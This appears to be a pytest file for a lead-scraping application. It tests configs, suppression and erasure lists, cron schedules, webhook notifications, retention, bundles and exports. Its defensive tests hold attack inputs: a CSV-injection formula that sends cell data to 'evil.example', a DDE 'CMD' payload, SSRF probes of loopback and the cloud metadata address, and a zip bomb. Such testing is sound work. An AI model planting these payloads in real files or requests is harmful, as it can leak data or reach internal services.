"""Phase 3 services: configs, suppression, schedules, notifications, erasure,
retention, bundles, catalog health, settings. All offline."""

from __future__ import annotations

import io
import json
import sys
import zipfile
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest
from sqlalchemy import select, update

sys.path.insert(0, str(Path(__file__).resolve().parent))

from leadscraper.core.cron import CronError, next_run  # noqa: E402
from leadscraper.core.lead import Lead  # noqa: E402
from leadscraper.core.secrets import is_secret_key, mask_url, scrub  # noqa: E402
from leadscraper.db.engine import open_database  # noqa: E402
from leadscraper.db.models import Organization, Run, Schedule  # noqa: E402
from leadscraper.db.runs import finish_run, record_failure, start_run  # noqa: E402
from leadscraper.db.store import LeadStore  # noqa: E402
from leadscraper.paths import PROJECT_ROOT  # noqa: E402
from leadscraper.services import (  # noqa: E402
    bundle, catalog, configs, exports, notifications, organizations, projects, retention, runs,
    schedules, settings, suppression,
)
from leadscraper.services.errors import Conflict, Invalid, NotFound  # noqa: E402
from leadscraper.services.workspace import default_workspace  # noqa: E402

UTC = timezone.utc


@pytest.fixture
def engine():
    from app_db import fresh_application_db

    engine = fresh_application_db()
    yield engine
    engine.dispose()


@pytest.fixture
def ws(engine):
    return default_workspace(engine)


def document(name: str = "Pune dentists", **extra) -> dict:
    return {"schema_version": 1, "name": name, "project": name,
            "geography": {"country": "IN", "places": ["Pune"], "center": [18.52, 73.85],
                          "admin_area": "Maharashtra"},
            "lead_types": {"local_business": {"categories": [{"name": "Dentists"}]}}, **extra}


def seeded_run(engine, ws, project: str = "Pune dentists", leads=None, **finish) -> int:
    """A finished run that wrote `leads` into `project` (as a worker would)."""
    store = LeadStore(engine, project=project, country="IN")
    run_id = start_run(engine, ws.id, store.project_id, config_snapshot=document(project))
    store.run_id = run_id
    for item in leads or []:
        store.upsert(item)
    store.close()
    finish_run(engine, run_id, stats={"engine": {"new": len(leads or []), "units_done": 1,
                                                 "units_total": 1}}, **finish)
    return run_id


def lead(name: str, phone: str, website: str | None = None, locality: str = "Baner") -> Lead:
    return Lead(business_name=name, locality=locality, category="Dentists", phones=[phone],
                website=website, sources=["google_maps"])


# --- saved configs -------------------------------------------------------------------------

def test_saved_configs_version_clone_import_export(engine, ws):
    first = configs.create_config(engine, ws, document(), description="draft")
    assert (first["version"], first["versions"]) == (1, 1)
    same = configs.save_version(engine, ws, first["id"], document())
    assert same["version"] == 1                                   # unchanged: no new version
    second = configs.save_version(engine, ws, first["id"], document(depth="quick"),
                                  description="quicker")
    assert (second["version"], second["id"]) == (2, first["id"])
    assert configs.get_config(engine, ws, first["id"], version=1)["document"].get("depth") is None
    assert [v["version"] for v in configs.list_versions(engine, ws, first["id"])] == [1, 2]
    with pytest.raises(Conflict):
        configs.create_config(engine, ws, document())
    clone = configs.clone_config(engine, ws, first["id"], "Nashik dentists", version=1)
    assert clone["document"]["name"] == "Nashik dentists" and clone["version"] == 1
    listing = configs.list_configs(engine, ws, sort="-name")
    assert [c["name"] for c in listing.items] == ["Pune dentists", "Nashik dentists"]

    filename, text = configs.export_config(engine, ws, first["id"], fmt="yaml")
    assert filename == "pune-dentists-v2.yaml" and "depth: quick" in text
    imported = configs.import_config(engine, ws, text.replace("quick", "deep"))
    assert imported["id"] == first["id"] and imported["version"] == 3
    legacy = (PROJECT_ROOT / "config.nashik.yaml").read_text(encoding="utf-8")
    venues = configs.import_config(engine, ws, legacy, filename="config.nashik.yaml")
    assert venues["name"] == "Nashik venues" and venues["document"]["schema_version"] == 1

    with pytest.raises(Invalid) as bad:
        configs.create_config(engine, ws, {"schema_version": 1, "name": "x", "project": "x",
                                           "geography": {"country": "ZZ", "places": ["Nowhere"]},
                                           "lead_types": {"local_business": {
                                               "categories": [{"name": "A"}]}}})
    assert bad.value.errors and "ISO 3166" in json.dumps(bad.value.errors)
    configs.delete_config(engine, ws, first["id"])
    with pytest.raises(NotFound):
        configs.get_config(engine, ws, first["id"])


def test_secrets_are_scrubbed_from_exports():
    assert is_secret_key("api_key") and is_secret_key("smtp_password")
    assert is_secret_key("db_url") and is_secret_key("webhook_url")
    assert not is_secret_key("max_tokens") and not is_secret_key("password_secret_name")
    assert not is_secret_key("spreadsheet_id")
    doc = {"ai": {"api_key": "sk-123", "max_tokens": 50},
           "runtime": {"db_url": "postgresql://u:pw@h/db"},
           "notify": {"password_secret_name": "smtp"}}
    assert scrub(doc) == {"ai": {"max_tokens": 50}, "runtime": {},
                          "notify": {"password_secret_name": "smtp"}}
    assert mask_url("https://hooks.slack.com/services/T/B/x") == "https://hooks.slack.com/***"


# --- suppression ----------------------------------------------------------------------------------

def test_suppression_lists_exclude_and_flag_in_exports(engine, ws):
    run_id = seeded_run(engine, ws, leads=[
        lead("Smile Dental", "+919820012345", "https://smiledental.in"),
        lead("Tooth Fairy Clinic", "+919820054321"),
        lead("Bright Smiles", "+919820099999")])
    csv_bytes = "name,website,phone\nSmile Dental,,\n,,+91 98200 54321\n".encode()
    customers = suppression.create_list(engine, ws, name="Customers", mode="exclude")
    result = suppression.import_file(engine, ws, customers["id"], csv_bytes, "customers.csv")
    assert result == {"added": 2, "skipped": 0, "read": 2}
    from openpyxl import Workbook

    book = Workbook()
    book.active.append(["Domain"])
    book.active.append(["www.brightsmiles.example.in"])
    buffer = io.BytesIO()
    book.save(buffer)
    rivals = suppression.create_list(engine, ws, name="Competitors", mode="flag",
                                     entries=[{"value": "Bright Smiles"}])
    assert suppression.import_file(engine, ws, rivals["id"], buffer.getvalue(),
                                   "rivals.xlsx")["added"] == 1
    assert suppression.get_list(engine, ws, rivals["id"])["entries"] == 2

    # Not attached to the run's config: only the erasure list would apply.
    _, content, _ = exports.export(engine, ws, "json", run_id=run_id)
    assert json.loads(content)["count"] == 3
    # Attached by name in the config.
    with engine.begin() as conn:
        conn.execute(update(Run.__table__).where(Run.__table__.c.id == run_id).values(
            config_snapshot=document(filters={"suppression_lists": ["Customers",
                                                                    "Competitors"]})))
    _, content, _ = exports.export(engine, ws, "json", run_id=run_id)
    data = json.loads(content)
    assert data["count"] == 1 and data["excluded_by_suppression"] == 2
    assert data["records"][0]["suppressed"] == ["Competitors"]
    assert data["columns"][-1] == "Suppressed"
    csv_text = exports.export(engine, ws, "csv", run_id=run_id)[1].decode("utf-8-sig")
    assert csv_text.splitlines()[0].endswith(",Suppressed")
    assert "Bright Smiles" in csv_text and "Smile Dental" not in csv_text


# --- erasure -----------------------------------------------------------------------------------------

def test_erase_by_domain_and_phone_across_projects(engine, ws):
    seeded_run(engine, ws, "Pune dentists", [lead("Smile Dental", "+919820012345",
                                                  "https://www.smiledental.in")])
    seeded_run(engine, ws, "Nashik dentists", [lead("Smile Dental Nashik", "+919820011111",
                                                    "https://smiledental.in/nashik")])
    seeded_run(engine, ws, "Pune caterers", [lead("Royal Caterers", "+919820077777")])
    dry = organizations.erase(engine, ws, domain="smiledental.in", dry_run=True)
    assert dry["count"] == 2 and dry["suppression_list"] is None
    done = organizations.erase(engine, ws, domain="https://smiledental.in")
    assert done["count"] == 2 and done["suppression_list"] == "Erasure requests"
    phone = organizations.erase(engine, ws, phone="98200 77777", region="IN")
    assert [e["name"] for e in phone["erased"]] == ["Royal Caterers"]
    with engine.connect() as conn:
        assert conn.execute(select(Organization.__table__.c.id)).all() == []
    with pytest.raises(Invalid):
        organizations.erase(engine, ws, domain="gmail.com")          # a shared host
    # Found again by a later run: the erasure list keeps it out of every export.
    again = seeded_run(engine, ws, "Pune dentists", [lead("Smile Dental", "+919820012345",
                                                          "https://www.smiledental.in")])
    assert json.loads(exports.export(engine, ws, "json", run_id=again)[1])["count"] == 0


# --- schedules and cron -------------------------------------------------------------------------------

def test_cron_parses_and_computes_the_next_run():
    at = datetime(2026, 10, 7, 10, 15, tzinfo=UTC)
    assert next_run("*/15 * * * *", at) == datetime(2026, 10, 7, 10, 30, tzinfo=UTC)
    assert next_run("0 6 * * mon-fri", at, "Asia/Kolkata") == \
        datetime(2026, 10, 8, 0, 30, tzinfo=UTC)                     # 06:00 IST
    assert next_run("@monthly", at) == datetime(2026, 11, 1, tzinfo=UTC)
    # Day of month OR day of week when both are restricted (Vixie cron).
    assert next_run("0 9 1 * mon", at) == datetime(2026, 10, 12, 9, tzinfo=UTC)
    # Across a DST change: 09:00 New York is 13:00 UTC in summer, 14:00 in winter.
    assert next_run("0 9 * * *", datetime(2026, 11, 1, 12, tzinfo=UTC), "America/New_York") \
        == datetime(2026, 11, 1, 14, tzinfo=UTC)
    for bad in ("* * *", "61 * * * *", "0 0 * * funday", "*/0 * * * *"):
        with pytest.raises(CronError):
            next_run(bad, at)
    with pytest.raises(CronError):
        next_run("@daily", at, "Mars/Olympus")


def test_due_schedules_queue_runs_once_and_only_new_points_at_the_last_one(engine, ws):
    saved = configs.create_config(engine, ws, document())
    schedule = schedules.create_schedule(engine, ws, saved_config_id=saved["id"],
                                         cron="0 6 * * *", timezone="Asia/Kolkata",
                                         only_new=True, overrides={"depth": "quick"})
    assert schedule["next_run_at"] > datetime.now(UTC)
    with pytest.raises(Invalid):
        schedules.create_schedule(engine, ws, saved_config_id=saved["id"], cron="every day")
    assert schedules.fire_due(engine) == []                          # not due yet
    due = datetime.now(UTC) - timedelta(minutes=1)
    with engine.begin() as conn:
        conn.execute(update(Schedule.__table__).values(next_run_at=due))
    [first] = schedules.fire_due(engine)
    assert schedules.fire_due(engine) == []                          # claimed: fires once
    run = runs.get_run(engine, ws, first)
    assert run["status"] == "queued" and run["request"]["depth"] == "quick"
    assert run["request"]["schedule_id"] == schedule["id"]
    assert run["request"]["only_new_since"] is None
    after = schedules.get_schedule(engine, ws, schedule["id"])
    assert after["last_run_id"] == first and after["next_run_at"] > datetime.now(UTC)
    second = schedules.run_now(engine, ws, schedule["id"])
    assert runs.get_run(engine, ws, second)["request"]["only_new_since"] == first
    paused = schedules.update_schedule(engine, ws, schedule["id"], enabled=False)
    assert paused["next_run_at"] is None


# --- notifications --------------------------------------------------------------------------------

def test_notifications_go_to_subscribed_targets_and_never_raise(engine, ws, monkeypatch):
    sent = []

    class Response:
        status_code = 200

    def post(url, json=None, timeout=None, allow_redirects=True):
        sent.append((url, json))
        if "broken" in url:
            raise ConnectionError("refused")
        return Response()

    import requests

    monkeypatch.setattr(requests, "post", post)
    # Name resolution varies by network (some resolvers answer anything); the
    # host guard is tested on literal addresses below.
    real_check = notifications.check_host
    monkeypatch.setattr(notifications, "check_host", lambda host: None)
    hook = notifications.create_target(engine, ws, name="Sales", kind="webhook",
                                       config={"url": "https://hooks.example/abc"})
    assert hook["config"]["url"] == "https://hooks.example/***"       # masked
    notifications.create_target(engine, ws, name="Broken", kind="webhook",
                                config={"url": "https://broken.example/x"},
                                events=["run_failed"])
    with pytest.raises(Invalid):
        notifications.create_target(engine, ws, name="Bad", kind="webhook",
                                    config={"url": "ftp://x"})
    with pytest.raises(Invalid):
        notifications.create_target(engine, ws, name="Mail", kind="email",
                                    config={"host": "smtp.example.com"})
    with pytest.raises(Invalid):                     # only notify-* secrets can be referenced
        notifications.create_target(engine, ws, name="Mail", kind="email", config={
            "host": "smtp.example.com", "from": "a@example.com", "to": ["b@example.com"],
            "password_secret_name": "db-password"})
    # Loopback / private destinations are refused at send time (SSRF).
    with pytest.raises(RuntimeError, match="private address"):
        real_check("127.0.0.1")
    with pytest.raises(RuntimeError, match="private address"):
        real_check("169.254.169.254")
    monkeypatch.setenv(notifications.PRIVATE_ENV, "1")
    real_check("127.0.0.1")
    monkeypatch.delenv(notifications.PRIVATE_ENV)

    completed = seeded_run(engine, ws, leads=[lead("Smile Dental", "+919820012345")])
    results = notifications.notify_run(engine, completed)
    assert [r["ok"] for r in results] == [True]                      # Broken: not subscribed
    assert sent[0][1]["event"] == "run_completed" and "Lead run" in sent[0][1]["text"]

    store = LeadStore(engine, project="Pune dentists")
    failing = start_run(engine, ws.id, store.project_id)
    store.close()
    for _ in range(5):
        record_failure(engine, ws.id, {"source": "justdial", "reason": "blocked"},
                       run_id=failing)
    finish_run(engine, failing, status="completed", stats={"engine": {}})
    events, reasons = notifications.run_events(engine, runs.run_row(engine, ws, failing))
    assert events == ["run_completed", "needs_attention"] and "blocked 5 times" in reasons[0]
    finish_run(engine, failing, status="failed", error="engine error")
    results = notifications.notify_run(engine, failing)
    assert sorted(r["ok"] for r in results) == [False, True]          # one target down
    broken = [t for t in notifications.list_targets(engine, ws).items if t["name"] == "Broken"]
    assert "refused" in broken[0]["last_error"]


# --- retention, settings ----------------------------------------------------------------------------

def test_settings_merge_and_fill_what_a_config_leaves_unset(engine, ws):
    current = settings.get_settings(engine, ws)
    assert current["robots_txt"] is True and current["retention"]["logs_days"] == 30
    updated = settings.update_settings(engine, ws, {"retention": {"logs_days": 7},
                                                    "keep_awake": False})
    assert updated["retention"] == {"logs_days": 7, "events_days": 90, "seen_urls_days": 90}
    with pytest.raises(Invalid):
        settings.update_settings(engine, ws, {"retention": {"logs_days": 0}})
    with pytest.raises(Invalid):
        settings.update_settings(engine, ws, {"data_dir": "/elsewhere"})
    from leadscraper.config import Config

    config = Config({"runtime": {"robots_txt": False}})
    settings.apply_to_config(engine, ws.id, config)
    assert config.get("runtime.keep_awake") is False                   # from the workspace
    assert config.get("runtime.robots_txt") is False                   # the config wins


def test_retention_purges_old_events_urls_and_organisations(engine, ws):
    run_id = seeded_run(engine, ws, leads=[lead("Old Dental", "+919820012345"),
                                           lead("New Dental", "+919820054321")])
    project = projects.find_project(engine, ws, "Pune dentists")
    projects.update_project(engine, ws, project["id"], retention_days=30)
    long_ago = datetime.now(UTC) - timedelta(days=200)
    from leadscraper.db.models import RunEvent

    with engine.begin() as conn:
        conn.execute(RunEvent.__table__.insert().values(
            workspace_id=ws.id, run_id=run_id, seq=1, type="activity", payload={},
            created_at=long_ago))
        conn.execute(update(Run.__table__).values(finished_at=long_ago, created_at=long_ago))
        conn.execute(update(Organization.__table__).where(
            Organization.__table__.c.name == "Old Dental").values(updated_at=long_ago))
    # Found again by a recent run with nothing to add: still "seen", so kept.
    seeded_run(engine, ws, leads=[lead("New Dental", "+919820054321")])
    with engine.begin() as conn:
        conn.execute(update(Organization.__table__).values(updated_at=long_ago))
    dry = retention.purge(engine, ws, dry_run=True)
    assert (dry["events"], dry["organizations"]) == (1, {"Pune dentists": 1})
    done = retention.purge(engine, ws)
    assert done["events"] == 1
    remaining = organizations.list_organizations(engine, ws, project_id=project["id"])
    assert [o["name"] for o in remaining.items] == ["New Dental"]


# --- catalog ---------------------------------------------------------------------------------------

def test_every_source_has_catalog_notes_and_applicability():
    from leadscraper.sources.notes import NOTES
    from leadscraper.sources.registry import DISCOVERY_SOURCES, ENRICHMENT_SOURCES

    assert set(DISCOVERY_SOURCES) | set(ENRICHMENT_SOURCES) <= set(NOTES)
    us = {s["name"]: s for s in catalog.sources(country="US", with_health=False)}
    assert us["google_maps"]["applicable"] and not us["justdial"]["applicable"]
    assert "covers IN" in us["justdial"]["reason"]
    assert us["linkedin_serp"]["fills"] == ["decision_makers"]
    [local] = catalog.lead_types("US")
    assert local["key"] == "local_business" and local["applicable"]
    assert any(c["header"] == "Phones" for c in local["columns"])


def test_source_health_flags_a_source_that_keeps_finding_nothing(engine, ws):
    from leadscraper.db.runs import plan_units

    store = LeadStore(engine, project="Health")
    for attempt in range(3):
        run_id = start_run(engine, ws.id, store.project_id)
        plan_units(engine, ws.id, run_id, [
            {"lead_type": "local_business", "source": "sulekha", "area": "A", "category": "C",
             "scope": "combo", "unit_key": f"k{attempt}", "status": "done"},
            {"lead_type": "local_business", "source": "google_maps", "area": "A",
             "category": "C", "scope": "combo", "unit_key": f"m{attempt}", "status": "done",
             "found": 5}])
        record_failure(engine, ws.id, {"source": "sulekha", "reason": "no_listings"},
                       run_id=run_id)
        record_failure(engine, ws.id, {"source": "justdial", "reason": "blocked"},
                       run_id=run_id)
        finish_run(engine, run_id, stats={})
    store.close()
    health = catalog.source_health(engine, ws)
    assert health["sulekha"]["status"] == "likely_broken"
    assert health["google_maps"]["status"] == "ok" and health["google_maps"]["success_rate"] == 1
    assert health["justdial"]["blocks"] == 3 and health["justdial"]["status"] == "degraded"
    listed = {s["name"]: s for s in catalog.sources(engine, ws)}
    assert listed["sulekha"]["health"]["status"] == "likely_broken"
    assert listed["airbnb"]["health"] == {"status": "unknown"}


# --- bundles ----------------------------------------------------------------------------------------

def test_bundle_round_trip_into_a_fresh_database(engine, ws, tmp_path, monkeypatch):
    seeded_run(engine, ws, leads=[lead("Smile Dental", "+919820012345",
                                       "https://smiledental.in"),
                                  lead("Tooth Fairy", "+919820054321")])
    saved = configs.create_config(engine, ws, document(ai={"enabled": False,
                                                           "api_key": "sk-secret"}))
    configs.save_version(engine, ws, saved["id"], document(depth="quick"))
    schedules.create_schedule(engine, ws, saved_config_id=saved["id"], cron="@weekly")
    suppression.create_list(engine, ws, name="Customers", entries=[{"value": "acme.example"}])
    notifications.create_target(engine, ws, name="Hook", kind="webhook",
                                config={"url": "https://hooks.example/SECRET-TOKEN"})
    data = bundle.export_bundle(engine, ws, include_leads=True, include_history=True)

    with zipfile.ZipFile(io.BytesIO(data)) as zf:
        names = set(zf.namelist())
        everything = b"".join(zf.read(n) for n in names)
    assert {"manifest.json", "saved_configs.json", "projects.json",
            "leads/pune-dentists.json", "history/pune-dentists.json"} <= names
    assert b"sk-secret" not in everything and b"SECRET-TOKEN" not in everything
    assert "presets/nashik-venues.yaml" in names

    # Another machine: a fresh data directory and its own SQLite database (with
    # the Postgres test mode on, this is also a Postgres -> SQLite round trip).
    monkeypatch.setenv("LEADSCRAPER_DATA_DIR", str(tmp_path / "other"))
    other = open_database(f"sqlite:///{(tmp_path / 'other.sqlite3').as_posix()}")
    try:
        other_ws = default_workspace(other)
        report = bundle.import_bundle(other, other_ws, data)
        assert report["saved_configs"] == {"added": 2, "skipped": 0, "invalid": []}
        assert report["organizations"]["pune-dentists"] == {"mode": "verbatim", "imported": 2}
        assert report["runs"] == 1 and report["schedules"]["added"] == 1
        project = projects.find_project(other, other_ws, "Pune dentists")
        orgs = organizations.list_organizations(other, other_ws, project_id=project["id"],
                                                sort="name").items
        assert [o["name"] for o in orgs] == ["Smile Dental", "Tooth Fairy"]
        detail = organizations.get_organization(other, other_ws, orgs[0]["id"])
        assert detail["contacts"] and detail["identity_keys"]
        [imported_run] = runs.list_runs(other, other_ws).items
        assert imported_run["status"] == "completed"
        assert runs.get_run(other, other_ws, imported_run["id"])["organizations"] == {"new": 2}
        [schedule] = schedules.list_schedules(other, other_ws).items
        assert schedule["enabled"] is False                          # never starts on its own
        assert notifications.list_targets(other, other_ws).total == 0
        # Idempotent: a second import adds nothing new and merges the leads.
        again = bundle.import_bundle(other, other_ws, data)
        assert again["saved_configs"]["skipped"] == 2
        assert again["runs"] == 0 and again["runs_skipped"] == 1     # no duplicate history
        assert again["organizations"]["pune-dentists"]["unchanged"] == 2
        assert organizations.list_organizations(other, other_ws,
                                                project_id=project["id"]).total == 2
    finally:
        other.dispose()


def test_bundles_from_a_newer_version_are_refused(engine, ws):
    data = bundle.export_bundle(engine, ws)
    for change, message in (({"format_version": 99}, "format version 99"),
                            ({"schema_revision": "9999"}, "newer version"),
                            ({"format": "zip"}, "not a bundle")):
        buffer = io.BytesIO()
        with zipfile.ZipFile(io.BytesIO(data)) as src, zipfile.ZipFile(buffer, "w") as dst:
            for name in src.namelist():
                content = src.read(name)
                if name == "manifest.json":
                    content = json.dumps({**json.loads(content), **change}).encode()
                dst.writestr(name, content)
        with pytest.raises(Invalid, match=message):
            bundle.import_bundle(engine, ws, buffer.getvalue())
    with pytest.raises(Invalid, match="not a zip"):
        bundle.import_bundle(engine, ws, b"plain text")
    bomb = io.BytesIO()
    with zipfile.ZipFile(bomb, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("manifest.json", b"\0" * (20 * 1024 * 1024))   # 20 MB of zeros
    with pytest.raises(Invalid, match="would unpack"):
        bundle.import_bundle(engine, ws, bomb.getvalue())


# --- membership and diff --------------------------------------------------------------------------

def test_refinds_are_run_members_and_the_diff_classifies_them(engine, ws):
    first = seeded_run(engine, ws, leads=[lead("Smile Dental", "+919820012345"),
                                          lead("Tooth Fairy", "+919820054321")])
    second = seeded_run(engine, ws, leads=[
        lead("Smile Dental", "+919820012345"),                           # unchanged
        Lead(business_name="Tooth Fairy", locality="Baner", category="Dentists",
             phones=["+919820054321"], emails=["hi@toothfairy.example"],
             sources=["website"]),                                       # updated
        lead("Bright Smiles", "+919820099999")])                         # new
    detail = runs.get_run(engine, ws, second)
    assert detail["organizations"] == {"unchanged": 1, "updated": 1, "new": 1}
    diff = runs.diff_runs(engine, ws, second)
    assert diff["against"] == first
    assert diff["counts"] == {"new": 1, "updated": 1, "unchanged": 1, "only_in_against": 0}
    assert [i["change"] for i in diff["items"]] == ["new", "updated", "unchanged"]
    reverse = runs.diff_runs(engine, ws, first, against=second)
    assert reverse["counts"]["only_in_against"] == 1


def test_exports_never_carry_live_formulas(engine, ws):
    """Scraped text starting with = + - @ must not run in Excel / Sheets (CSV injection)."""
    from openpyxl import load_workbook

    evil = '=HYPERLINK("http://evil.example/?"&A2,"x")'
    run_id = seeded_run(engine, ws, leads=[
        Lead(business_name=evil, locality="Baner", category="Dentists",
             phones=["+919820012345"], address="@SUM(1+1)", sources=["google_maps"])])
    csv_text = exports.export(engine, ws, "csv", run_id=run_id)[1].decode("utf-8-sig")
    assert "'" + evil.replace('"', '""') in csv_text and "'@SUM(1+1)" in csv_text
    assert "+91 98200 12345" in csv_text and "'+91" not in csv_text   # phones untouched
    book = load_workbook(io.BytesIO(exports.export(engine, ws, "xlsx", run_id=run_id)[1]))
    sheet = book["Records"]
    headers = [c.value for c in sheet[1]]
    name = sheet.cell(2, headers.index("Business Name") + 1)
    assert name.data_type == "s" and name.value == evil
    assert exports.safe_cell("+91 98200 12345") == "+91 98200 12345"
    assert exports.safe_cell("-3.5") == "-3.5"
    assert exports.safe_cell("+CMD|' /C calc'!A0").startswith("'")
